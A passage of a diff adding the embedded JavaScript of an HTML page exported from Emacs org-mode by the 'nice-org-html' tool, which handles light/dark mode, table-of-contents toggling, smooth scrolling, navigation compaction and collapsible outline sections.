+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+;; JS for html exported by et-org-html.el
+ */
+
+const preamble = document.getElementById("preamble");
+const content = document.getElementById("content");
+const postamble = document.getElementById("postamble");
+
+const controls = document.getElementById("view-controls");
+const toggleTocBtn = document.getElementById("toggle-toc");
+const gotoTopBtn = document.getElementById("goto-top");
+const toggleModeBtn = document.getElementById("toggle-mode");
+const toc = document.getElementById("table-of-contents");
+
+// Get and parse options passed in cookie string
+const optCookie = document.cookie.split('; ').find(r => r.startsWith('options'));
+const options = {};
+if (optCookie) {
+  optCookie.split('=')[1].split('__').forEach(pair => {
+    const [key, val] = pair.split(':');
+    if (key && val) {
+      options[key] = val;
+    }
+  })
+}
+
+// Move sticky control bar (injected within preamble)
+document.body.insertBefore(controls, content);
+
+// Mode handling
+function getMode() {
+  let cookie = document.cookie.split('; ').find(r => r.startsWith('mode'))
+  return cookie && cookie.split("=")[1];
+}
+
+function setMode(mode) {
+  document.body.dataset.mode = mode;
+  let thmCookie = document.cookie.split('; ').find(r => r.startsWith(mode));
+  document.body.dataset.theme = thmCookie ? thmCookie.split('=')[1] : 'unknown';
+  toggleModeBtn.innerHTML = (mode === 'light') ? '&#9789;' : '&#9788;';
+  document.cookie = 'mode=' + mode;
+}
+
+// Initially, set mode based on stored cookie
+let mode = getMode();
+if (mode && ["light", "dark"].includes(mode)) {
+  setMode(mode);
+} else {  
+  let prop = "prefers-color-scheme";
+  let pref = (mode === "query") && window.matchMedia &&
+    ["light", "dark"].find(s => window.matchMedia(`(${prop}: ${s})`).matches);
+  setMode(pref || "dark"); // fallback: dark
+}
+
+// Mode toggling
+toggleModeBtn.addEventListener('click', () => {
+  setMode(document.body.dataset.mode === 'dark' ? 'light' : 'dark');
+})
+
+
+// Jump to top
+let scrollY = document.documentElement.scrollTop;
+window.addEventListener('scroll', () => {
+  let atTop = document.documentElement.scrollTop <= preamble.offsetHeight;
+  gotoTopBtn.dataset.show = !atTop + "";
+});
+gotoTopBtn.addEventListener('click', () => {
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
+})
+
+// Table-of-contents toggling
+if (toc) {
+  toggleTocBtn.dataset.show = 'true';
+  toggleTocBtn.addEventListener('click', () => {
+    let showingToc = document.body.dataset.toc;
+    scrollY = showingToc ? scrollY : document.documentElement.scrollTop;
+    if (showingToc) {
+      document.body.dataset.toc = '';
+      document.documentElement.scrollTop = scrollY;
+    } else {
+      let tocHeight =
+	Math.max(
+	  window.innerHeight - controls.offsetHeight,
+	  toc.offsetHeight
+	);
+      const header = document.getElementById("injected-header");
+      if (header && (scrollY > header.offsetHeight)) {
+	document.documentElement.scrollTop = preamble.offsetHeight;
+      }
+      toc.style.height = `${tocHeight}px`;
+      document.body.dataset.toc = 'true';
+    }
+    toc.addEventListener('click', () => {
+      if (document.body.dataset.toc) {
+	document.body.dataset.toc = '';
+	document.documentElement.scrollTop = scrollY;
+      }
+    })
+  })
+};
+
+// Instrument anchor linking for sticky control bar
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = e.currentTarget.getAttribute('href');
+    const target = document.querySelector(targetId);
+
+    setTimeout(() => {
+      const targetPos = target.getBoundingClientRect().top;
+      let offset = targetPos + document.documentElement.scrollTop;
+      offset -= controls.offsetHeight;
+      window.scrollTo({
+	top: offset,
+	behavior: "smooth"
+      });
+    }, 0);
+  });
+});
+
+function copyTextToClipboard(text) {
+  // Make invisible textarea
+  var textArea = document.createElement("textarea");
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+  textArea.style.padding = 0;
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+  textArea.style.background = 'transparent';
+
+  // Copy contents into it
+  textArea.value = text;
+
+  // Try to copy from it to clipboard
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  var res;
+  try {
+    res = document.execCommand('copy');
+  } catch (err) {
+    res = false;
+  }
+
+  // Remove invisible textarea
+  document.body.removeChild(textArea);
+
+  return res;
+}
+
+// Handle the default header / footer drawers
+const header = document.getElementById("generated-header");
+const footer = document.getElementById("generated-footer");
+
+if (header) {
+  let toggle = header.querySelector("header nav input.nav-toggle");
+  if (toggle) { toggle.checked = false; }
+}
+if (footer) {
+  let nav = footer.querySelector("nav");
+  let toggle = nav && nav.querySelector(".nav-toggle");
+  let navList = nav && nav.querySelector(".nav-list");
+  let navElem = navList && [...navList.querySelectorAll(".nav-item")];
+  let numLink = navElem && navElem.length;
+  if (numLink) {
+    toggle.checked = false;
+    toggle.addEventListener('change', () => {
+      if (toggle.checked) {
+	setTimeout(() => window.scrollTo({
+	  behavior: 'smooth',
+	  top: document.body.scrollHeight	  
+	}), 88);
+      }
+   });
+  }
+}
+
+function autoCompact() {
+  var anchor, links, overlap, trivial;
+  const domCompute = (node) => {
+    if (node) {
+      anchor = node.querySelector('.nav-title, .nav-author');
+      links = node.querySelector('.nav-list');
+      overlap = links.offsetLeft - 5 <= anchor.offsetLeft + anchor.offsetWidth;	
+      trivial = links.offsetLeft === anchor.offsetLeft;
+    }
+  };
+  let mediaMatch = window.matchMedia('(max-width: 768px)').matches;
+  [header, footer].forEach(e => {
+    if (e) {
+      if (mediaMatch) {
+	e.classList.add('compact');
+      } else {
+	domCompute(e);
+	if (overlap && !trivial) {
+	  e.classList.add('compact');
+	} else {	
+	  let clone = e.cloneNode(true);
+	  clone.style.top = '-2000px';
+	  clone.style.maxHeight = '0px';
+	  clone.classList.remove('compact');
+	  e.parentNode.insertBefore(clone, e);
+	  domCompute(clone);
+	  let toggle = e.querySelector('.nav-toggle');
+	  if (!overlap && toggle && !toggle.checked) {
+	    e.classList.remove('compact');
+	  }
+	  e.parentNode.removeChild(clone);
+	}
+      }
+    }
+  })
+}
+
+if ((header || footer)) {
+  if (options.hasOwnProperty('layout')) {
+    [header, footer].forEach(e => e ? e.classList.add(options.layout) : null);
+  } else {
+    autoCompact();
+    window.addEventListener('resize', autoCompact);
+  }
+}
+
+if (options.hasOwnProperty('src-lang') && options['src-lang'] == 't') {
+  let labels = [...document.querySelectorAll('.srcLangLabel')];
+  labels.forEach(l => l.style.display = 'inline-block');
+}
+
+if (options.hasOwnProperty('collapsing') && options.collapsing == 't') {
+  let levels = [2, 3, 4, 5, 6];
+  let containerPrefix = 'outline-container-';
+  levels.forEach(l => {
+    let containers = [...document.querySelectorAll(`.outline-${l}`)];
+    containers.forEach(c => {
+      let id = c.id.slice(containerPrefix.length);
+      let headline = document.getElementById(id);
+      let siblings = [...c.children].filter(child => child.id != id);
+      headline.classList.add('collapsible');
+      headline.addEventListener('click', () => {	
+	if (headline.classList.contains('collapsed')) {
+	  headline.classList.remove('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.remove('hidden');
+	  });	  
+	} else {
+	  headline.classList.add('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.add('hidden');
+	  });
+	}
+      })
+    })
+  })
+}
+/*]]>*/-->
+</script><div hidden>Generated by: https://github.com/ewantown/nice-org-html</div>
+</div>
+</body>
+</html>
